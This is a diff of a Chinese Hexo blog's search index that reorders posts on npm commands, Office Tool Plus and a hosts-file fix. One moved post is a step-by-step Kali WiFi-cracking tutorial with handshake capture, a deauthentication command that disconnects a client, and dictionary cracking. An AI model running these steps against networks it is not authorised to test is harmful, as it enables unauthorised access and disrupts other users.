@@ -756,6 +756,34 @@
       </tags>
   </entry>
   <entry>
+    <title>npm安装卸载命令</title>
+    <url>/2022/08/23/npm%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BD%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="npm安装模块"><a href="#npm安装模块" class="headerlink" title="npm安装模块"></a>npm安装模块</h2><p>利用 npm 安装xxx模块到当前命令行所在目录；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>利用npm安装全局模块xxx；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g xxx</span><br></pre></td></tr></table></figure>
+
+<h2 id="本地安装时将模块写入package-json中："><a href="#本地安装时将模块写入package-json中：" class="headerlink" title="本地安装时将模块写入package.json中："></a>本地安装时将模块写入package.json中：</h2><p>安装但不写入package.json；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx</span><br></pre></td></tr></table></figure>
+
+<p>安装并写入package.json的”dependencies”中；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx –save</span><br></pre></td></tr></table></figure>
+
+<p>安装并写入package.json的”devDependencies”中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx –save-dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="npm-删除模块"><a href="#npm-删除模块" class="headerlink" title="npm 删除模块"></a>npm 删除模块</h2><p>删除xxx模块；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall xxx</span><br></pre></td></tr></table></figure>
+
+<p>删除全局模块xxx；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall -g xxx</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>命令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用HEXO-GIT-BACKUP插件备份博客源文件</title>
     <url>/2022/08/21/%E4%BD%BF%E7%94%A8HEXO-GIT-BACKUP%E6%8F%92%E4%BB%B6%E5%A4%87%E4%BB%BD%E5%8D%9A%E5%AE%A2%E6%BA%90%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<p>在搭建好hexo博客之后也要给自己的博客进行备份，文章丢失可是很麻烦的一件事情。我的博客的数据都是直接保存在cloudstudio，用的时候总是会感觉有点问题，生怕自己哪天不小心把工作空间给删除了，那就蛮麻烦了。所以我采用了 <a href="https://github.com/coneycode/hexo-git-backup">hexo-git-backup</a> 这个工具进行备份。</p>
@@ -803,34 +831,6 @@
       </categories>
       <tags>
         <tag>插件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>npm安装卸载命令</title>
-    <url>/2022/08/23/npm%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BD%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="npm安装模块"><a href="#npm安装模块" class="headerlink" title="npm安装模块"></a>npm安装模块</h2><p>利用 npm 安装xxx模块到当前命令行所在目录；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>利用npm安装全局模块xxx；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g xxx</span><br></pre></td></tr></table></figure>
-
-<h2 id="本地安装时将模块写入package-json中："><a href="#本地安装时将模块写入package-json中：" class="headerlink" title="本地安装时将模块写入package.json中："></a>本地安装时将模块写入package.json中：</h2><p>安装但不写入package.json；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx</span><br></pre></td></tr></table></figure>
-
-<p>安装并写入package.json的”dependencies”中；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx –save</span><br></pre></td></tr></table></figure>
-
-<p>安装并写入package.json的”devDependencies”中。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install xxx –save-dev</span><br></pre></td></tr></table></figure>
-
-<h2 id="npm-删除模块"><a href="#npm-删除模块" class="headerlink" title="npm 删除模块"></a>npm 删除模块</h2><p>删除xxx模块；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall xxx</span><br></pre></td></tr></table></figure>
-
-<p>删除全局模块xxx；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall -g xxx</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>命令</tag>
       </tags>
   </entry>
   <entry>
@@ -971,65 +971,6 @@
       </tags>
   </entry>
   <entry>
-    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
-    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
-<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
-<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
-<p>下载了vm文件后可以直接用VMware打开，开机后<br> <strong>用户名：kali<br> 密码：kali</strong></p>
-<span id="more"></span>
-
-<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
-<p>打开一个终端窗口</p>
-<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
-<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
-<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
-<p>输入命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
-
-<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
-<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
-<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
-<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
-
-<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
-<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
-<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
-<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
-<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
-<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
-<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【安装Office】 Office Tool Plus 入门教程</title>
     <url>/2022/09/27/%E5%AE%89%E8%A3%85Office/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装 Office 是一件非常简单的事情，大家不必过于担心，更不必对自己没有信心。<br>本教程适用于需要全新安装 Office 的用户，若您需要修改 Office 请参阅 [<a href="https://movejian.github.io/2022/09/27/%E6%8A%80%E8%83%BD%E6%89%A9%E5%B1%95Office">技能扩展] Office Tool Plus 高级教程</a><br>任何人都可使用 Office Tool Plus 轻松地安装 Office，请认真阅读教程以避免因为疏忽出现问题。<br>如无特殊情况，文章中提到的 Windows 10 也适用于 Windows 11.</p>
@@ -1131,6 +1072,65 @@
 ]]></content>
       <tags>
         <tag>Office</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
+    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
+<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
+<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
+<p>下载了vm文件后可以直接用VMware打开，开机后<br> <strong>用户名：kali<br> 密码：kali</strong></p>
+<span id="more"></span>
+
+<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
+<p>打开一个终端窗口</p>
+<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
+<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
+<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
+<p>输入命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
+
+<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
+<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
+<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
+<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
+<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
+<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
+<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
+<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
+<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
+<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -1245,7 +1245,7 @@
 <h3 id="3-清除激活信息"><a href="#3-清除激活信息" class="headerlink" title="3. 清除激活信息"></a>3. 清除激活信息</h3><p><strong>卸载 Office 是不会清除激活信息的</strong>；为了避免出现问题，请按照以下操作清除激活信息：</p>
 <p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209270042413.png" alt="清除 Office 激活信息"></p>
 <p>如果账户授权无法撤销，在工具箱内「恢复 Office 设置为默认设置」。</p>
-<p>![重置 Office 为默认设置](D:\Program Files\PicGo\临时储存\reset-Office-settings.png)</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209270200030.png" alt="重置 Office 为默认设置"></p>
 <p>已经在上一个教程中做过了？那你可以跳过这一步了。</p>
 <h3 id="使用-Office-Tool-Plus-自动激活-Office"><a href="#使用-Office-Tool-Plus-自动激活-Office" class="headerlink" title="使用 Office Tool Plus 自动激活 Office"></a>使用 Office Tool Plus 自动激活 Office</h3><p>请确保你的 Office Tool Plus 是最新版本，过于陈旧的版本无法使用这些命令。</p>
 <p>旧版本打开命令框的快捷方式为<code>Ctrl+P</code>，最新版已修改。</p>
@@ -1439,36 +1439,6 @@
       </tags>
   </entry>
   <entry>
-    <title>继上一期解决github上的图片无法显示的问题</title>
-    <url>/2022/08/21/%E7%BB%A7%E4%B8%8A%E4%B8%80%E6%9C%9F%E8%A7%A3%E5%86%B3github%E4%B8%8A%E7%9A%84%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>​      <a href="https://movejian.github.io/2022/08/19/vscode%E9%85%8D%E7%BD%AEpicgo%E7%9A%84github%E7%9A%84%E5%9B%BE%E5%BA%8A/">继上篇github图床问题</a>无法正常显示，但在<strong>github</strong>上看到正常上传，连接也并非错误，百度了一下说什么<strong>DNS</strong>被污染了。解决方法是修改<strong>hosts</strong>文件或者修改<strong>DNS</strong>。</p>
-<p>​      首先，打开<a href="https://ping.eu/nslookup">域名解析</a>网站：<a href="https://ping.eu/nslookup">https://ping.eu/nslookup</a><br>然后输入raw.githubusercontent.com如下图：</p>
-<p><img src="https://movejian.github.io/images/20220821/5.png"></p>
-<span id="more"></span>
-<p>​      我们得到图床所用域名解析到的IP(上图红框中的地址)。</p>
-<ul>
-<li>最后打开本机的<strong>host</strong>文件，其路径如下：<br><code>C:\Windows\System32\drivers\etc\hosts</code>, 然后添加如下内容(上图红框中的地址)：</li>
-</ul>
-<p><img src="https://movejian.github.io/images/20220821/6.png"></p>
-<ul>
-<li>打开<strong>CMD</strong>输入命令<code>ipconfig /flushdns</code>刷新<strong>DNS</strong>缓存,再次输入<code>ipconfig/displaydns</code></li>
-</ul>
-<p>​    如果你的<strong>hosts</strong>的文件不见了,可以通过文件设置显示系统隐藏文件来找到，依然找不到，可能是被误删了，网上有很多是通过新建文本文档解决。也可以通过下面这个命令来生成<strong>hosts</strong>文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f %P in (&#x27;dir %windir%\WinSxS\hosts /b /s&#x27;) do copy %P %windir%\System32\drivers\etc &amp; echo %P &amp; Notepad %P</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>注意</strong>一定要使用管理员身份输入此命令。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>图床</tag>
-        <tag>问题解决</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【疑难解答】 Office Tool Plus 入门教程</title>
     <url>/2022/09/27/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94Office/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果你的系统本身就有诸多毛病，建议直接重装原版系统，这是最有效最快的解决办法。</p>
@@ -1597,6 +1567,36 @@
 ]]></content>
       <tags>
         <tag>Office</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>继上一期解决github上的图片无法显示的问题</title>
+    <url>/2022/08/21/%E7%BB%A7%E4%B8%8A%E4%B8%80%E6%9C%9F%E8%A7%A3%E5%86%B3github%E4%B8%8A%E7%9A%84%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>​      <a href="https://movejian.github.io/2022/08/19/vscode%E9%85%8D%E7%BD%AEpicgo%E7%9A%84github%E7%9A%84%E5%9B%BE%E5%BA%8A/">继上篇github图床问题</a>无法正常显示，但在<strong>github</strong>上看到正常上传，连接也并非错误，百度了一下说什么<strong>DNS</strong>被污染了。解决方法是修改<strong>hosts</strong>文件或者修改<strong>DNS</strong>。</p>
+<p>​      首先，打开<a href="https://ping.eu/nslookup">域名解析</a>网站：<a href="https://ping.eu/nslookup">https://ping.eu/nslookup</a><br>然后输入raw.githubusercontent.com如下图：</p>
+<p><img src="https://movejian.github.io/images/20220821/5.png"></p>
+<span id="more"></span>
+<p>​      我们得到图床所用域名解析到的IP(上图红框中的地址)。</p>
+<ul>
+<li>最后打开本机的<strong>host</strong>文件，其路径如下：<br><code>C:\Windows\System32\drivers\etc\hosts</code>, 然后添加如下内容(上图红框中的地址)：</li>
+</ul>
+<p><img src="https://movejian.github.io/images/20220821/6.png"></p>
+<ul>
+<li>打开<strong>CMD</strong>输入命令<code>ipconfig /flushdns</code>刷新<strong>DNS</strong>缓存,再次输入<code>ipconfig/displaydns</code></li>
+</ul>
+<p>​    如果你的<strong>hosts</strong>的文件不见了,可以通过文件设置显示系统隐藏文件来找到，依然找不到，可能是被误删了，网上有很多是通过新建文本文档解决。也可以通过下面这个命令来生成<strong>hosts</strong>文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f %P in (&#x27;dir %windir%\WinSxS\hosts /b /s&#x27;) do copy %P %windir%\System32\drivers\etc &amp; echo %P &amp; Notepad %P</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>注意</strong>一定要使用管理员身份输入此命令。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>图床</tag>
+        <tag>问题解决</tag>
       </tags>
   </entry>
   <entry>
